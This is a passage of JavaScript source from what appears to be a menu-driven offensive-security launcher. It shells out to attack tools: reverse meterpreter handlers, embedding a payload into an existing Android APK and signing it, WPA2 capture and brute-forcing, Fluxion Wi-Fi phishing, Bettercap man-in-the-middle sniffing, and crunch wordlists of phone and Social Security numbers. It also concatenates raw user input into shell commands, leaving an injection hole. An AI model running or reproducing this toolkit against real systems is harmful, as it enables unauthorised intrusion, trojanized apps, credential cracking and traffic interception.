  rl.question('\nWhat type of OS would you like a meterpreter handler for?'.yellow+'\n[0] '.cyan+'Back'.yellow+'\n[1] '.cyan+'Linux'.yellow+'\n[2] '.cyan+'Windows'.yellow+'\n[3] '.cyan+'Android'.yellow+'\n[4] '.cyan+'Java/JSP/WAR'.yellow+'\n[5] '.cyan+'ASP'.yellow+'\n\nSK:~$ '.yellow, (answer) => {
    if (!answer) {
      banner();
    } else if (answer == 0) {
      banner();
    } else {
      doMsfHandler(answer);
    }
  });
}

/**
 * doMsfHandler()
 * Spawn the requested reverse meterpreter handler
 **/
function doMsfHandler (answer) {
  if (!answer) {
    banner();
  } else if (answer == 0) {
    banner();
  } else if (answer == 1) {
    console.log('\nStarting Linux Reverse Meterpreter Handler ->'.yellow+' LHOST='.cyan+LHOST+''.yellow+' LPORT='.cyan+LPORT+''.yellow);
    exec('sudo -u '+USER+' xterm -bg black -fg green -geometry 90x30+0+0 -T "Linux Reverse Meterpreter Handler" -e "msfconsole -q -x \'use exploit/multi/handler;set PAYLOAD linux/x86/meterpreter/reverse_tcp;set LHOST '+LHOST+'; set LPORT '+LPORT+'; run;\'" &', (e,stdout,stderr) => {
        if (e instanceof Error) {
         console.error(e);
         throw e; 
        }
        if (stderr) console.log('stderr ', stderr);
        if (stdout) console.log('stdout ', stdout);
    }); 
  } else if (answer == 2) {
    console.log('\nStarting Windows Reverse Meterpreter Handler ->'.yellow+' LHOST='.cyan+LHOST+''.yellow+' LPORT='.cyan+LPORT+''.yellow);
    exec('sudo -u '+USER+' xterm -bg black -fg green -geometry 90x30+0+0 -T "Windows Reverse Meterpreter Handler" -e "msfconsole -q -x \'use exploit/multi/handler;set PAYLOAD windows/meterpreter/reverse_tcp;set LHOST '+LHOST+'; set LPORT '+LPORT+'; run;\'" &', (e,stdout,stderr) => {
        if (e instanceof Error) {
         console.error(e);
         throw e; 
        }
        if (stderr) console.log('stderr ', stderr);
        if (stdout) console.log('stdout ', stdout);
    }); 
  } else if (answer == 3) {
    console.log('\nStarting Android Reverse Meterpreter Handler ->'.yellow+' LHOST='.cyan+LHOST+''.yellow+' LPORT='.cyan+LPORT+''.yellow);
    exec('sudo -u '+USER+' xterm -bg black -fg green -geometry 90x30+0+0 -T "Android Reverse Meterpreter Handler" -e "'+MSFCON+' -q -x \'use exploit/multi/handler;set PAYLOAD android/meterpreter/reverse_tcp;set LHOST '+LHOST+'; set LPORT '+LPORT+'; run;\'" &', (e,stdout,stderr) => {
        if (e instanceof Error) {
         console.error(e);
         throw e; 
        }
        if (stderr) console.log('stderr ', stderr);
        if (stdout) console.log('stdout ', stdout);
    }); 
  } else if (answer == 4) {
    console.log('\nStarting Java Reverse Meterpreter Handler ->'.yellow+' LHOST='.cyan+LHOST+''.yellow+' LPORT='.cyan+LPORT+''.yellow);
    exec('sudo -u '+USER+' xterm -bg black -fg green -geometry 90x30+0+0 -T "Java Reverse Meterpreter Handler" -e "'+MSFCON+' -q -x \'use exploit/multi/handler;set PAYLOAD java/jsp_shell_reverse_tcp;set LHOST '+LHOST+'; set LPORT '+LPORT+'; run;\'" &', (e,stdout,stderr) => {
        if (e instanceof Error) {
         console.error(e);
         throw e; 
        }
        if (stderr) console.log('stderr ', stderr);
        if (stdout) console.log('stdout ', stdout);
    }); 
  } else if (answer == 5) {
    console.log('\nStarting ASP Reverse Meterpreter Handler ->'.yellow+' LHOST='.cyan+LHOST+''.yellow+' LPORT='.cyan+LPORT+''.yellow);
    exec('sudo -u '+USER+' xterm -bg black -fg green -geometry 90x30+0+0 -T "ASP Reverse Meterpreter Handler" -e "'+MSFCON+' -q -x \'use exploit/multi/handler;set PAYLOAD windows/meterpreter/reverse_tcp;set LHOST '+LHOST+'; set LPORT '+LPORT+'; run;\'" &', (e,stdout,stderr) => {
        if (e instanceof Error) {
         console.error(e);
         throw e; 
        }
        if (stderr) console.log('stderr ', stderr);
        if (stdout) console.log('stdout ', stdout);
    }); 
  }
  banner();
}

/**
 * signAPK()
 * Request required data from user for signapk
 **/
function SignAPK() {
  rl.question('\nHow would you like to sign the default created APK?'.yellow+'\n[0] '.cyan+'Back'.yellow+'\n[1] '.cyan+'SignApk'.yellow+'\n[2] '.cyan+'Spade'.yellow+'\n\nSK:~$ '.yellow, (answer) => {
    if (!answer) {
      banner();
    } else if (answer == 0) {
      banner();
    } else { 
      doSignAPK(answer);
    }
  });
}

/**
 * doSignAPK()
 * Sign an APK file with a certificate
 * Certificate must be trusted on the device!??
 **/
function doSignAPK(val) {
  if (!val) {
    banner();
  } else if (val == 0) {
    banner();
  } else if (val == 1) { //SignApk
    exec('sudo -u '+USER+' xterm -bg black -fg green -geometry 90x30+0+0 -T "SignApk - Signing APK" -e "java -jar '+SIGNAPK+'/dist/signapk.jar '+SIGNAPK+'/testkey.x509.pem '+SIGNAPK+'/testkey.pk8 '+CWD+'/android_remote.apk '+CWD+'/android_remote-signed.apk" &', (e,stdout,stderr) => {
      if (e instanceof Error) {
        console.error(e);
        throw e; 
      }
      if (stderr) console.log('stderr ', stderr);
      if (stdout) console.log('stdout ', stdout);
    });
  } else if (val == 2) { //Spade
    exec('xterm -bg black -fg green -geometry 90x30+0+0 -T "Spade - Signing APK" -e "java -jar '+SPADE+'/signapk.jar '+SPADE+'/cert.x509.pem '+SPADE+'/privatekey.pk8 '+CWD+'/android_remote.apk '+CWD+'/android_remote-signed.apk" &', (e,stdout,stderr) => {
      if (e instanceof Error) {
        console.error(e);
        throw e; 
      }
      if (stderr) console.log('stderr ', stderr);
      if (stdout) console.log('stdout ', stdout);
    });
  }
}

/**
 * embedAPK()
 * Request required data from user for embedapk/spade
 **/
function embedAPK() {
  rl.question('\n[0] '.cyan+'Back'.yellow+'\n\nAPK file to use?\n\nSK:~$ '.yellow, (answer) => {
    if (!answer) {
      banner();
    } else if (answer == 0) {
      banner();
    } else { 
      doEmbedAPK(answer);
    }
  });
}

/**
 * doEmbedAPK()
 * Embed an existing Andorid app apk with a payload, and sign it with a cert
 **/
function doEmbedAPK(answer) {
  if (!answer) {
    banner();
  } else if (answer == 0) {
    banner();
  } else if (answer) { 
    exec('sudo -u '+USER+' xterm -bg black -fg green -geometry 90x30+0+0 -T "Spade - Embed & Sign APK" -e "'+SPADE+'/./spade.py'+answer+'" &', (e,stdout,stderr) => {
      if (e instanceof Error) {
        console.error(e);
        throw e; 
      }
      if (stderr) console.log('stderr ', stderr);
      if (stdout) console.log('stdout ', stdout);
    });
  } else {
    banner();
  }
  banner();
}

/**
 * airodump()
 * Request required data from user for airodump session to spawn 
 **/
function airodump() {
  rl.question('\n[0] '.cyan+'Back'.yellow+'\n[1] '.cyan+'All Routers and Channels'.yellow+'\n[2] '.cyan+'Targeted Packet Capture'.yellow+'\n\nSK:~$ '.yellow, (answer) => {
    if (!answer) {
      banner();
    } else if (answer == 0) {
      banner();
    } else if (answer == 1) {
      doAirodump(answer, undefined, undefined);
    } else if (answer == 2) {
      rl.question('\nBSSID?'.yellow+'\n\nSK:~$ '.yellow, (bssid) => {
        rl.question('\nChannel?'.yellow+'\n\nSK:~$ '.yellow, (channel) => {
          rl.question('\nSave HTML report as?'.yellow+'\n\nSK:~$ '.yellow, (report) => {
            doAirodump(answer, bssid, channel, report);
          });
        });
      });
    }
  });
}

/**
 * doAirodump()
 * Starts an airodump-ng session
 **/
function doAirodump(answer, bssid, channel, report) {
  if (!answer) {
    banner();
  } else if (answer == 0) {
    banner();
  } else if (answer == 1) { // Monitor ALL channels/routers
    exec('sudo ifconfig '+WIFI+' down', (e,stdout,stderr) => {
        if (e instanceof Error) {
         console.error(e);
         throw e; 
        }
        if (stderr) console.log('stderr ', stderr);
        if (stdout) console.log('stdout ', stdout);
        exec('sudo iwconfig '+WIFI+' mode monitor', (e,stdout,stderr) => {
          if (e instanceof Error) {
           console.error(e);
           throw e; 
          }
          if (stderr) console.log('stderr ', stderr);
          if (stdout) console.log('stdout ', stdout);
          exec('xterm -hold -bg black -fg green -geometry 90x30+0+0 -T "Airodump" -e "sudo '+AIRODUMP+' '+WIFI+'" &', (e,stdout,stderr) => {
            if (e instanceof Error) {
              console.error(e);
              throw e; 
            }
            if (stderr) console.log('stderr ', stderr);
            if (stdout) console.log('stdout ', stdout);
          });
        });
    });
  } else if (answer == 2) { // Target BSSID and save cap
    exec('sudo ifconfig '+WIFI+' down', (e,stdout,stderr) => {
      if (e instanceof Error) {
       console.error(e);
       throw e; 
      }
      if (stderr) console.log('stderr ', stderr);
      if (stdout) console.log('stdout ', stdout);
      exec('sudo iwconfig '+WIFI+' mode monitor', (e,stdout,stderr) => {
        if (e instanceof Error) {
         console.error(e);
         throw e; 
        }
        if (stderr) console.log('stderr ', stderr);
        if (stdout) console.log('stdout ', stdout);
        exec('xterm -hold -bg black -fg green -geometry 90x30+0+0 -T "Airodump" -e "sudo '+AIRODUMP+' -c '+channel+' --bssid '+bssid+' -w '+report+' '+WIFI+'" &', (e,stdout,stderr) => {
          if (e instanceof Error) {
            console.error(e);
            throw e; 
          }
          if (stderr) console.log('stderr ', stderr);
          if (stdout) console.log('stdout ', stdout);
        });
      });
    });
  }
  banner();
}

/**
 * aircrack()
 * Request required data from user for aircrack session to spawn 
 **/
function aircrack() {
  console.log('');
  rl.question('\n[0] '.cyan+'Back'.yellow+'\n[1] '.cyan+'WPA2'.yellow+'\n:~$ '.yellow, (answer) => {
    if (!answer) {
      banner();
    } else if (answer == 0) {
      banner();
    } else if (answer == 1) {
      rl.question('\nBSSID?'.yellow+'\n\nSK:~$ '.yellow, (bssid) => {
        rl.question('\nWordlist?'.yellow+'\n\nSK:~$ '.yellow, (wordlist) => {
          rl.question('\nCapture (.cap)?'.yellow+'\n\nSK:~$ '.yellow, (cap) => {
            doAircrack(answer, bssid, wordlist, cap);
          });
        });
      });
    }
  });
}

/**
 * doAircrack()
 * Start an aircrack session using the users specified input
 **/
function doAircrack(answer, bssid, wordlist, cap) {
  if (!answer) {
    banner();
  } else if (answer == 0) {
    banner();
  } else if (answer == 1) { // WPA2 Bruteforce
    exec('xterm -hold -bg black -fg green -geometry 90x30+0+0 -T "Bruteforcing '+bssid+' WPA2 with '+wordlist+'" -e "'+AIRCRACK+' -a2 -b '+bssid+' -w '+wordlist+' '+cap+'" &', (e,stdout,stderr) => {
      if (e instanceof Error) {
        console.error(e);
        throw e; 
      }
      if (stderr) console.log('stderr ', stderr);
      if (stdout) console.log('stdout ', stdout);
    });
  }
  banner();
}

/**
 * anonimizer()
 * Request required data from user for anonimizer
 **/
function anonimizer() {
  console.log('');
  rl.question('\nWould you like to Start/Stop 4nonimizer?'.yellow+'\n[0] '.cyan+'Back'.yellow+'\n[1] '.cyan+'Update'.yellow+'\n[2] '.cyan+'Update VPNs'.yellow+'\n[3] '.cyan+'Start'.yellow+'\n[4] '.cyan+'Stop'.yellow+'\n[5] '.cyan+'Stop No-Net'.yellow+'\n[6] '.cyan+'Change Provider'.yellow+'\n[7] '.cyan+'Test Availability'.yellow+'\n[8] '.cyan+'Change IP'.yellow+'\n[9] '.cyan+'Browser'.yellow+'\n\nSK:~$ '.yellow, (answer) => {
    doAnonimizer(answer);
  });
}

/**
 * doAnonimizer()
 * Start/Stop Anonimizer
 **/
function doAnonimizer(answer) {
  if (!answer) {
    banner();
  } else if (answer == 0) { 
    banner();
  } else if (answer == 1) { 
    exec('xterm -hold -bg black -fg green -geometry 90x30+0+0 -T "Updating 4nonimizer" -e "cd '+ANONI+' && sudo '+ANONI+'/./4nonimizer update_app" &', (e,stdout,stderr) => {
      if (e instanceof Error) {
        console.error(e);
        throw e; 
      }
      if (stderr) console.log('stderr ', stderr);
      if (stdout) console.log('stdout ', stdout);
    });
  } else if (answer == 2) { 
    exec('xterm -hold -bg black -fg green -geometry 90x30+0+0 -T "Updating 4nonimizer VPNs" -e "cd '+ANONI+' && sudo '+ANONI+'/./4nonimizer update_vpns" &', (e,stdout,stderr) => {
      if (e instanceof Error) {
        console.error(e);
        throw e; 
      }
      if (stderr) console.log('stderr ', stderr);
      if (stdout) console.log('stdout ', stdout);
    });
  } else if (answer == 3) { 
    exec('xterm -hold -bg black -fg green -geometry 90x30+0+0 -T "Starting 4nonimizer" -e "cd '+ANONI+' && sudo '+ANONI+'/./4nonimizer start" &', (e,stdout,stderr) => {
      if (e instanceof Error) {
        console.error(e);
        throw e; 
      }
      if (stderr) console.log('stderr ', stderr);
      if (stdout) console.log('stdout ', stdout);
    });
  } else if (answer == 4) { 
    exec('xterm -hold -bg black -fg green -geometry 90x30+0+0 -T "Stopping 4nonimizer" -e "cd '+ANONI+' && sudo '+ANONI+'/./4nonimizer stop" &', (e,stdout,stderr) => {
      if (e instanceof Error) {
        console.error(e);
        throw e; 
      }
      if (stderr) console.log('stderr ', stderr);
      if (stdout) console.log('stdout ', stdout);
    });
  } else if (answer == 5) { 
    exec('xterm -hold -bg black -fg green -geometry 90x30+0+0 -T "Stopping 4nonimizer and Network" -e "cd '+ANONI+' && sudo '+ANONI+'/./4nonimizer stop_nonet" &', (e,stdout,stderr) => {
      if (e instanceof Error) {
        console.error(e);
        throw e; 
      }
      if (stderr) console.log('stderr ', stderr);
      if (stdout) console.log('stdout ', stdout);
    });
  } else if (answer == 6) { 
    exec('xterm -hold -bg black -fg green -geometry 90x30+0+0 -T "Changing 4nonimizer Provider" -e "cd '+ANONI+' && sudo '+ANONI+'/./4nonimizer change_provider" &', (e,stdout,stderr) => {
      if (e instanceof Error) {
        console.error(e);
        throw e; 
      }
      if (stderr) console.log('stderr ', stderr);
      if (stdout) console.log('stdout ', stdout);
    });
  } else if (answer == 7) { 
    exec('xterm -hold -bg black -fg green -geometry 90x30+0+0 -T "Test 4nonimizer Provider Availability" -e "cd '+ANONI+' && sudo '+ANONI+'/./4nonimizer test_availability" &', (e,stdout,stderr) => {
      if (e instanceof Error) {
        console.error(e);
        throw e; 
      }
      if (stderr) console.log('stderr ', stderr);
      if (stdout) console.log('stdout ', stdout);
    });
  } else if (answer == 8) { 
    exec('xterm -hold -bg black -fg green -geometry 90x30+0+0 -T "Changing 4nonimizer IP" -e "cd '+ANONI+' && sudo '+ANONI+'/./4nonimizer change_ip" &', (e,stdout,stderr) => {
      if (e instanceof Error) {
        console.error(e);
        throw e; 
      }
      if (stderr) console.log('stderr ', stderr);
      if (stdout) console.log('stdout ', stdout);
    });
  } else if (answer == 9) { 
    exec('xterm -bg black -fg green -geometry 90x30+0+0 -T "Starting 4nonimizer Browser Profile pirvoxy->tor" -e "cd '+ANONI+' && sudo '+ANONI+'/./4nonimizer browser" &', (e,stdout,stderr) => {
      if (e instanceof Error) {
        console.error(e);
        throw e; 
      }
      if (stderr) console.log('stderr ', stderr);
      if (stdout) console.log('stdout ', stdout);
    });
  }
  banner();
}

/**
 * fluxion()
 * Spawn our fluxion process to perform social engineering / trickery on wifi networks
 **/
function fluxion () {
  rl.question('\nWould you like to run fluxion? (y/n)'.yellow+'\n\nSK:~$ '.yellow, (answer) => {
    if (!answer) {
      banner();
    } else if (answer1 == 0) {
      banner();
    } else {
      exec('xterm -hold -bg black -fg green -geometry 90x30+0+0 -T "Fluxion" -e "sudo '+FLUXION+'/./fluxion" &', (e,stdout,stderr) => {
        if (e instanceof Error) {
         console.error(e);
         throw e; 
        }
        if (stderr) console.log('stderr ', stderr);
        if (stdout) console.log('stdout ', stdout);
      });
    } 
  }); 
}

/**
 * reverseMeterpreter()
 * Request required data from user for a golismero session
 **/
function golismero() {
  console.log('');
  rl.question('\nSite to scan?'.yellow+'\n\nSK:~$ '.yellow, (answer1) => {
    if (!answer1) {
      banner();
    } else if (answer1 == 0) {
      banner();
    } else {
      rl.question('\nSave HTML report to?'.yellow+'\n\nSK:~$ '.yellow, (answer2) => {
        doGolismero(answer1, answer2);
      });
    } 
  });
}

/**
 * doGolismero()
 * Scan a website with GoLismero
 **/
function doGolismero(site, dir) {
  if (site && dir) { 
    exec('sudo -u '+USER+' xterm -hold -bg black -fg green -geometry 150x60+0+0 -T "GoLismero Website Scan" -e "golismero -d brute_dns scan '+site+' -o '+dir+' --full" &', (e,stdout,stderr) => {
      if (e instanceof Error) {
        console.error(e);
        throw e; 
      }
      if (stderr) console.log('stderr ', stderr);
      if (stdout) console.log('stdout ', stdout);
    });
  }
  banner();
}

/**
 * bettercap()
 * Request required data from user for pre-defined Bettercap session to run
 **/
function bettercap() {
  console.log('');
  rl.question('What type of session would you like?'.yellow+'\n[0] '.cyan+'Back'.yellow+'\n[1] '.cyan+'Sniffer'.yellow+'\n[2] '.cyan+'Proxy'.yellow+'\n[3] '.cyan+'Proxy/Targeted IP'.yellow+'\n\nSK:~$ '.yellow, (answer) => {
    if (!answer) {
      banner();
    } else if(answer == 0) {
      banner();
    } else if(answer == 1) {
      doBettercap(answer, undefined);
    } else if(answer == 2) {
      doBettercap(answer, undefined);
    } else if(answer == 3) {
      rl.question('\nIP?\n:~$ ', (ip) => {
        doBettercap(answer, ip);
      });
    }
  });
}

/**
 * doBettercap()
 * Perform a Bettercap MITM Attack based on users choice
 **/
function doBettercap(answer, ip) {
  if (!answer) {
    banner();
  } else if(answer == 0) {
      banner();
  } else if (answer == 1) { // Sniffer
    exec('xterm -hold -bg black -fg green -geometry 150x60+0+0 -T "Bettercap Sniffer ('+WIFI+')" -e "sudo bettercap -I '+WIFI+' -X" &', (e,stdout,stderr) => {
      if (e instanceof Error) {
        console.error(e);
        throw e; 
      }
      if (stderr) console.log('stderr ', stderr);
      if (stdout) console.log('stdout ', stdout);
    });
  } else if (answer == 2) { // Proxy
    exec('xterm -hold -bg black -fg green -geometry 150x60+0+0 -T "Bettercap Proxy ('+WIFI+')" -e "sudo bettercap -I '+WIFI+' --proxy" &', (e,stdout,stderr) => {
      if (e instanceof Error) {
        console.error(e);
        throw e; 
      }
      if (stderr) console.log('stderr ', stderr);
      if (stdout) console.log('stdout ', stdout);
    });
  } else if (answer == 3) { // Proxy/Targetd IP
    exec('xterm -hold -bg black -fg green -geometry 150x60+0+0 -T "Bettercap Proxy/Targeted ('+WIFI+') - ('+ip+')" -e "sudo bettercap -I '+WIFI+' --proxy -T '+ip+'" &', (e,stdout,stderr) => {
      if (e instanceof Error) {
        console.error(e);
        throw e; 
      }
      if (stderr) console.log('stderr ', stderr);
      if (stdout) console.log('stdout ', stdout);
    });
  }
  banner();
}

/**
 * crunch()
 * Request required data from user for pre-defined Crunch session to run
 **/
function crunch() {
  rl.question('\nSelect a wordlist to generate?'.yellow+'\n[0] '.cyan+'Back'.yellow+'\n[1] '.cyan+'Phone Numbers - %%%%%%%%%%'.yellow+'\n[2] '.cyan+'Phone Numbers - %%%-%%%-%%%%'.yellow+'\n[3] '.cyan+'Phone Numbers w. Country - %%%%%%%%%%%'.yellow+'\n[4] '.cyan+'Phone Numbers w. Country - %-%%%-%%%-%%%%'.yellow+'\n[5] '.cyan+'Social Security Numbers - %%%%%%%%%'.yellow+'\n[6] '.cyan+'Social Security Numbers - %%%-%%-%%%%'.yellow+'\n\nSK:~$ '.yellow, (answer) => {
    if (answer == 0) {
      banner();
    } else if (answer == 1 || answer == 2 || answer == 3 || answer == 4) {
      rl.question('\nEnter an area code:\n\nSK:~$ ', (acode) => {
        doCrunch(answer, acode);
      });
    } else {
      doCrunch(answer, undefined);
    }
  });
}

/**
 * doCrunch()
 * Generate a pre-defined wordlist with Crunch
 **/
function doCrunch(answer, acode) {
  if (!answer) {
    banner();
  } else if (answer == 0) {
      banner();
  } else if (answer == 1) { 
    exec('sudo -u '+USER+' xterm -hold -bg black -fg green -geometry 150x60+0+0 -T "Generating Phone Number List ('+acode+'%%%%%%%)" -e "crunch 10 10 1234567890 -t '+acode+'%%%%%%% > phone_numbers.txt" &', (e,stdout,stderr) => {
      if (e instanceof Error) {
        console.error(e);
        throw e; 
      }
      if (stderr) console.log('stderr ', stderr);
      if (stdout) console.log('stdout ', stdout);
    });
  } else if (answer == 2) { 
    exec('sudo -u '+USER+' xterm -hold -bg black -fg green -geometry 150x60+0+0 -T "Generating Phone Number List ('+acode+'-%%%-%%%%)" -e "crunch 12 12 1234567890 -t '+acode+'-%%%-%%%% > hyphen_phone_numbers.txt" &', (e,stdout,stderr) => {
      if (e instanceof Error) {
        console.error(e);
        throw e; 
      }
      if (stderr) console.log('stderr ', stderr);
      if (stdout) console.log('stdout ', stdout);
    });
  } else if (answer == 3) { 
    exec('sudo -u '+USER+' xterm -hold -bg black -fg green -geometry 150x60+0+0 -T "Generating Country Code Phone Number List (%'+acode+'%%%%%%%)" -e "crunch 11 11 1234567890 -t %'+acode+'%%%%%%% > ccode_phone_numbers.txt" &', (e,stdout,stderr) => {
      if (e instanceof Error) {
        console.error(e);
        throw e; 
      }
      if (stderr) console.log('stderr ', stderr);
      if (stdout) console.log('stdout ', stdout);
    });
  } else if (answer == 4) { 
    exec('sudo -u '+USER+' xterm -hold -bg black -fg green -geometry 150x60+0+0 -T "Generating Country Code Phone Number List (%-'+acode+'-%%%-%%%%)" -e "crunch 14 14 1234567890 -t %-'+acode+'-%%%-%%%% > hyphen_ccode_phone_numbers.txt" &', (e,stdout,stderr) => {
      if (e instanceof Error) {
        console.error(e);
        throw e; 
      }
      if (stderr) console.log('stderr ', stderr);
      if (stdout) console.log('stdout ', stdout);
    });
  } else if (answer == 5) { 
    exec('sudo -u '+USER+' xterm -hold -bg black -fg green -geometry 150x60+0+0 -T "Social Security Numbers (%%%%%%%%%)" -e "crunch 9 9 1234567890 -t %%%%%%%%% > ss_numbers" &', (e,stdout,stderr) => {
      if (e instanceof Error) {
        console.error(e);
        throw e; 
      }
      if (stderr) console.log('stderr ', stderr);
      if (stdout) console.log('stdout ', stdout);
    });
  } else if (answer == 6) { 
    exec('sudo -u '+USER+' xterm -hold -bg black -fg green -geometry 150x60+0+0 -T "Social Security Numbers (%%%-%%-%%%%)" -e "crunch 11 11 1234567890 -t %%%-%%-%%%% > hyphen_ss_numbers" &', (e,stdout,stderr) => {
      if (e instanceof Error) {
        console.error(e);
        throw e; 
      }
      if (stderr) console.log('stderr ', stderr);
      if (stdout) console.log('stdout ', stdout);
    });
  }
  banner();
}

/**
 * recon()
 * Request required data from user for doRecon()
 **/
function recon() {
  rl.question('\nSelect a website to perform recon with?'.yellow+'\n[0] '.cyan+'Back'.yellow+'\n[1] '.cyan+'Google Dorks'.yellow+'\n[2] '.cyan+'Linkedin'.yellow+'\n[3] '.cyan+'Facebook'.yellow+'\n[4] '.cyan+'Twitter'.yellow+'\n[5] '.cyan+'Indeed'.yellow+'\n[6] '.cyan+'SEC.GOV'.yellow+'\n[7] '.cyan+'Archive - WayBackMachine'.yellow+'\n[8] '.cyan+'ARIN'.yellow+'\n[9] '.cyan+'WHIOS'.yellow+'\n\nSK:~$ '.yellow, (answer) => {
    if (answer == 9) {
      rl.question('\nPlease provide the domain you would like to whois:\n'.yellow, (domain) => {
         doRecon(answer, domain);
      });
    } else {
      doRecon(answer, undefined);
    }
  });
}

/**
 * doRecon()
 * Execute recon websites for the user
 **/
function doRecon(answer,domain) {
  if (!answer) {
    banner();
  } else if (answer == 0) {
      banner();
  } else if (answer == 1) { 
    exec('sudo -u '+USER+' xterm -bg black -fg green -geometry 50x20+0+0 -T "Firefox - Google Hacking Database" -e "firefox https://www.exploit-db.com/google-hacking-database/" &', (e,stdout,stderr) => {

      if (e instanceof Error) {
        console.error(e);
        throw e; 
      }
      if (stderr) console.log('stderr ', stderr);
      if (stdout) console.log('stdout ', stdout);
    });
  } else if (answer == 2) { 
    exec('sudo -u '+USER+' xterm -bg black -fg green -geometry 50x20+0+0 -T "Firefox - Linkedin" -e "firefox https://www.linkedin.com" &', (e,stdout,stderr) => {
      if (e instanceof Error) {
        console.error(e);
        throw e; 
      }
      if (stderr) console.log('stderr ', stderr);
      if (stdout) console.log('stdout ', stdout);
    });
  } else if (answer == 3) { 
    exec('sudo -u '+USER+' xterm -bg black -fg green -geometry 50x20+0+0 -T "Firefox - Facebook" -e "firefox https://www.facebook.com" &', (e,stdout,stderr) => {
      if (e instanceof Error) {
        console.error(e);
        throw e; 
      }
      if (stderr) console.log('stderr ', stderr);
      if (stdout) console.log('stdout ', stdout);
    });
  } else if (answer == 4) { 
    exec('sudo -u '+USER+' xterm -bg black -fg green -geometry 50x20+0+0 -T "Firefox - Linkedin" -e "firefox https://www.twitter.com" &', (e,stdout,stderr) => {
      if (e instanceof Error) {
        console.error(e);
        throw e; 
      }
      if (stderr) console.log('stderr ', stderr);
      if (stdout) console.log('stdout ', stdout);
    });
  } else if (answer == 5) { 
    exec('sudo -u '+USER+' xterm -bg black -fg green -geometry 50x20+0+0 -T "Firefox - Indeed" -e "firefox https://www.indeed.com" &', (e,stdout,stderr) => {
      if (e instanceof Error) {
        console.error(e);
        throw e; 
      }
      if (stderr) console.log('stderr ', stderr);
      if (stdout) console.log('stdout ', stdout);
    });
  } else if (answer == 6) { 
    exec('sudo -u '+USER+' xterm -bg black -fg green -geometry 50x20+0+0 -T "Firefox - SEC.GOV" -e "firefox https://www.sec.gov/edgar/searchedgar/webusers.htm" &', (e,stdout,stderr) => {
      if (e instanceof Error) {
        console.error(e);
        throw e; 
      }
      if (stderr) console.log('stderr ', stderr);
      if (stdout) console.log('stdout ', stdout);
    });
  } else if (answer == 7) { 
    exec('sudo -u '+USER+' xterm -bg black -fg green -geometry 50x20+0+0 -T "Firefox - Archive" -e "firefox https://www.archive.org" &', (e,stdout,stderr) => {
      if (e instanceof Error) {
        console.error(e);
        throw e; 
      }
      if (stderr) console.log('stderr ', stderr);
      if (stdout) console.log('stdout ', stdout);
    });
  } else if (answer == 8) { 
    exec('sudo -u '+USER+' xterm -bg black -fg green -geometry 50x20+0+0 -T "Firefox - ARIN" -e "firefox https://www.arin.net" &', (e,stdout,stderr) => {
      if (e instanceof Error) {
        console.error(e);
        throw e; 
      }
      if (stderr) console.log('stderr ', stderr);
      if (stdout) console.log('stdout ', stdout);
    });
  } else if (answer == 9) { 
    exec('sudo -u '+USER+' xterm -hold -bg black -fg green -geometry 150x60+0+0 -T "Whois - '+domain+'" -e "sudo -u '+USER+' whois '+domain+'" &', (e,stdout,stderr) => {
      if (e instanceof Error) {
        console.error(e);
        throw e; 
      }
      if (stderr) console.log('stderr ', stderr);
      if (stdout) console.log('stdout ', stdout);
    });
  }

  banner();
}

/**
 * truffleHog()
 * Request required data from user for truffle hog
 **/
function truffleHog() {
  rl.question('\nPlease provide the git repository you would like to scan:\n'.yellow, (answer) => {
    doTruffleHog(answer);
  });
}

/**
 * doTruffleHog()
 * Parse the provided repository with Truffle Hog
 **/
function doTruffleHog(repo) {
  if (!repo) {
    banner();
  } else if (repo == 0) {
    banner();
  } else if (repo) { // Sniffer
    exec('sudo -u '+USER+' xterm -hold -bg black -fg green -geometry 150x60+0+0 -T "Parsing ('+repo+') with Truffle Hog" -e "cd '+TRUFFLEHOG+' && ./truffleHog.py '+repo+'" &', (e,stdout,stderr) => {
      if (e instanceof Error) {
        console.error(e);
        throw e; 
      }
      if (stderr) console.log('stderr ', stderr);
      if (stdout) console.log('stdout ', stdout);
    });
  } 
  banner();
}

/**
 * nikto()
 * Request required data from user for nikto
 **/
function nikto() {
  console.log('');
  rl.question('What type of nikto session would you like?'.yellow+'\n[0] '.cyan+'Back'.yellow+'\n[1] '.cyan+'Nikto'.yellow+'\n[2] '.cyan+'Nikto SSL'.yellow+'\n[3] '.cyan+'Nikto No-SSL'.yellow+'\n[4] '.cyan+'Nikto Injection (XSS/Script/HTML)'.yellow+'\n[5] '.cyan+'Nikto Injection (XSS/Script/HTML) w/ SSL'.yellow+'\n[6] '.cyan+'Nikto ALL CGI-DIRS'.yellow+'\n\nSK:~$ '.yellow, (answer) => {
    if (!answer) {
      banner();
    } else if(answer == 0) {
      banner();
    } else if(answer == 1) {
      rl.question('\nWebsite?\n:~$ ', (website) => {
        doNikto(answer, website);
      });
    } else if(answer == 2) {
      rl.question('\nWebsite?\n:~$ ', (website) => {
        doNikto(answer, website);
      });
    } else if(answer == 3) {
      rl.question('\nWebsite?\n:~$ ', (website) => {
        doNikto(answer, website);
      });
    } else if(answer == 4) {
      rl.question('\nWebsite?\n:~$ ', (website) => {
        doNikto(answer, website);
      });
    } else if(answer == 5) {
      rl.question('\nWebsite?\n:~$ ', (website) => {
        doNikto(answer, website);
      });
    } else if(answer == 6) {
      rl.question('\nWebsite?\n:~$ ', (website) => {
        doNikto(answer, website);
      });
    }
  });
}

/**
 * doNikto()
 * Perform website scan using nikto
 **/
function doNikto(answer,website) {
  if (!answer || !website) {
    banner();
  } else if (answer == 0) {
    banner();
  } else if (answer == 1) { // nikto -h
    exec('sudo -u '+USER+' xterm -hold -bg black -fg green -geometry 150x60+0+0 -T "Scanning ('+website+') with Nikto" -e "nikto -h '+website+'" &', (e,stdout,stderr) => {
      if (e instanceof Error) {
        console.error(e);
        throw e; 
      }
      if (stderr) console.log('stderr ', stderr);
      if (stdout) console.log('stdout ', stdout);
    });
  } else if (answer == 2) { // nikto -h -ssl
    exec('sudo -u '+USER+' xterm -hold -bg black -fg green -geometry 150x60+0+0 -T "Scanning ('+website+') with Nikto -ssl option" -e "nikto -ssl -h '+website+'" &', (e,stdout,stderr) => {
      if (e instanceof Error) {
        console.error(e);
        throw e; 
      }
      if (stderr) console.log('stderr ', stderr);
      if (stdout) console.log('stdout ', stdout);
    });
  } else if (answer == 3) { // nikto -h -nossl
    exec('sudo -u '+USER+' xterm -hold -bg black -fg green -geometry 150x60+0+0 -T "Scanning ('+website+') with Nikto -nossl option" -e "nikto -nossl -h '+website+'" &', (e,stdout,stderr) => {
      if (e instanceof Error) {
        console.error(e);
        throw e; 
      }
      if (stderr) console.log('stderr ', stderr);
      if (stdout) console.log('stdout ', stdout);
    });
